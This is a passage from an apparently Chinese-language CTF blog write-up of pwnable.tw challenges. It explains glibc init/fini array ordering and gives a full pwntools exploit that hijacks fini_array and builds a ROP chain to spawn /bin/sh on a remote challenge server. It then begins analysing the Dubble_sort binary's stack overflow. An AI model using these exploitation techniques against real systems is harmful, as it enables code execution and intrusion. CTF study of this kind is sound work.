     the dynamic linker (before initializing any shared object).  */</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">LIBC_NONSHARED</span></span>
  <span class="token comment">/* For static executables, preinit happens right before init.  */</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token class-name">size_t</span> size <span class="token operator">=</span> __preinit_array_end <span class="token operator">-</span> __preinit_array_start<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>__preinit_array_start <span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">NO_INITFINI</span></span>
  <span class="token function">_init</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

  <span class="token keyword">const</span> <span class="token class-name">size_t</span> size <span class="token operator">=</span> __init_array_end <span class="token operator">-</span> __init_array_start<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token comment">//正序输入</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>__init_array_start <span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/* This function should not be used anymore.  We run the executable's
   destructor now just like any other.  We cannot remove the function,
   though.  */</span>
<span class="token keyword">void</span>
<span class="token function">__libc_csu_fini</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">LIBC_NONSHARED</span></span>
  <span class="token class-name">size_t</span> i <span class="token operator">=</span> __fini_array_end <span class="token operator">-</span> __fini_array_start<span class="token punctuation">;</span> <span class="token comment">//通过循环，可以看到fini_array是倒序输入</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>__fini_array_start <span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//最后调用的fini_arry</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ifndef</span> <span class="token expression">NO_INITFINI</span></span>
  <span class="token function">_fini</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><p>可以看到，<strong>init</strong>调用<code>init_array</code>,<strong>fini</strong> 调用 <code>fini_array</code> 而且<code>init_array</code>是从0开始迭代增长，<code>fini_array</code>从i下标开始向0迭代.</p> <p>而且由于 程序一开始是从 <strong>start</strong>函数进行。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>STATIC <span class="token keyword">int</span>
<span class="token function">LIBC_START_MAIN</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>main<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span> MAIN_AUXVEC_DECL<span class="token punctuation">)</span><span class="token punctuation">,</span>
         <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">LIBC_START_MAIN_AUXVEC_ARG</span></span>
         <span class="token function">ElfW</span><span class="token punctuation">(</span><span class="token class-name">auxv_t</span><span class="token punctuation">)</span> <span class="token operator">*</span>auxvec<span class="token punctuation">,</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
         <span class="token function">__typeof</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> init<span class="token punctuation">,</span>
         <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>fini<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
         <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>rtld_fini<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>stack_end<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="https://i.loli.net/2021/04/26/v1bHialrweotZzW.png" alt="start"></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token function">__libc_start_main</span><span class="token punctuation">(</span> main<span class="token punctuation">,</span> argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> __libc_csu_init<span class="token punctuation">,</span> __libc_csu_fini<span class="token punctuation">,</span> edx<span class="token punctuation">,</span> top of stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>执行流程就如<code>_start -&gt; __libc_start_main -&gt; init -&gt; main -&gt; fini</code></p> <p>利用流程大致是这样，进行修改，无限循环main，这样也能方便复写。(想到这样操作的是真的强)</p> <p><img src="https://i.loli.net/2021/04/26/XDbMEzmYdA2Uo8n.png" alt="libc"></p> <h4 id="exp-4"><a href="#exp-4" class="header-anchor">#</a> exp</h4> <details class="custom-block details"><summary>exp</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># vim:fenc=utf-8</span>
<span class="token comment">#</span>
<span class="token comment"># Distributed under terms of the MIT license.</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

pie  <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token number">64</span>
bps  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x401C29</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">&quot;addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">&quot;data:&quot;</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    fini_array <span class="token operator">=</span> <span class="token number">0x04B40F0</span>
    libc_csu_fini <span class="token operator">=</span> <span class="token number">0x0402960</span>
    main <span class="token operator">=</span> <span class="token number">0x0401B6D</span>
    ebp <span class="token operator">=</span> <span class="token number">0x04B4100</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x0401696</span>
    pop_rsi <span class="token operator">=</span> <span class="token number">0x0406c30</span>
    leave_ret <span class="token operator">=</span> <span class="token number">0x0401C4B</span>
    pop_rax <span class="token operator">=</span> <span class="token number">0x041e4af</span>
    bin_sh <span class="token operator">=</span> <span class="token number">0x04b4148</span>
    pop_rdx <span class="token operator">=</span> <span class="token number">0x0446e35</span>
    syscall <span class="token operator">=</span> <span class="token number">0x04022b4</span>

    array <span class="token operator">=</span> flat<span class="token punctuation">(</span>libc_csu_fini<span class="token punctuation">,</span>main<span class="token punctuation">)</span>
    gdba<span class="token punctuation">(</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>fini_array<span class="token punctuation">,</span>array<span class="token punctuation">)</span>


    write<span class="token punctuation">(</span>bin_sh<span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token operator">+</span><span class="token number">48</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token operator">+</span><span class="token number">56</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>ebp<span class="token operator">+</span><span class="token number">64</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token punctuation">)</span>
    write<span class="token punctuation">(</span>fini_array<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>



context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;chall.pwnable.tw&quot;</span><span class="token punctuation">,</span><span class="token number">10105</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gdba</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    cmd <span class="token operator">=</span><span class="token string">'set follow-fork-mode parent\n'</span>
    <span class="token comment">#cmd=''</span>
    <span class="token keyword">if</span> pie<span class="token punctuation">:</span>
        base <span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&quot;pmap {}|grep bin |awk '{{print $1}}'&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token operator">+</span>base<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">'set $base={:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
        slog<span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base	
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>

re  <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> t <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>m<span class="token punctuation">,</span> timeout<span class="token operator">=</span>t<span class="token punctuation">)</span>
recv<span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>

<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">blast</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

slog_show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br></div></div></details> <h2 id="dubble-sort"><a href="#dubble-sort" class="header-anchor">#</a> Dubble_sort</h2> <h4 id="分析-5"><a href="#分析-5" class="header-anchor">#</a> 分析</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/mnt/f/pwnable.tw/dubblesort/dubblesort'</span>
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>可恶啊，什么都开了。分析程序</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  _BYTE <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// edi</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// esi</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// esi</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-74h] BYREF</span>
  _BYTE v9<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-70h] BYREF</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-50h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+7Ch] [ebp-10h]</span>

  v11 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&quot;What your name :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment">// 或许能泄露出libc地址</span>
  <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&quot;Hello %s,How many numbers do you what to sort :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">&quot;%u&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 能够负数输入</span>
  v3 <span class="token operator">=</span> v8<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v4 <span class="token operator">=</span> v9<span class="token punctuation">;</span>                                    <span class="token comment">// v9的数组类型为byte型，下面的输入方式相当于只能输入8个数字</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v8<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>                  <span class="token comment">// 输入的个数不限，能让数组溢出，覆盖后位</span>
    <span class="token punctuation">{</span>
      <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&quot;Enter the %d number : &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment">// 清空stdout，对输入无效</span>
      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">&quot;%u&quot;</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 向数组里u-int型，每一个步长一个数据</span>
      v3 <span class="token operator">=</span> v8<span class="token punctuation">;</span>
      v4 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">sort</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>                                 <span class="token comment">// 冒泡排序</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Result :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> v8<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
      <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&quot;%u &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
